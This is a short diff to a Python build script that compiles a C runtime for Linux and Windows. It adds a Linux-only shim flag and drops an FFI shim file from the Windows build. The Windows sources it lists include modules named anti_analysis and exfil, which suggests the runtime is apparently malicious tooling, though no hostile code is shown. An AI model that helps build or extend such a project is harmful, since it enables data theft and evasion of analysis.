@@ -222,6 +222,9 @@ def stage_compile_runtime(build_dir, platform="windows"):
     include_dir = RUNTIME_DIR / "include"
     objs = []
 
+    # Only use FFI shims for Linux (Windows has full implementations)
+    use_shims = (platform == "linux")
+
     if platform == "linux":
         compiler = "gcc"
         cflags = ["-O2", "-c", "-D_GNU_SOURCE", "-fPIC",
@@ -280,7 +283,6 @@ def stage_compile_runtime(build_dir, platform="windows"):
 
     WIN = RUNTIME_DIR / "windows"
     sources_win = [
-        RUNTIME_DIR / "ffi_shims.c",
         RUNTIME_DIR / "init" / "anti_analysis.c",
         RUNTIME_DIR / "util" / "mem.c",
         RUNTIME_DIR / "exfil" / "exfil.c",
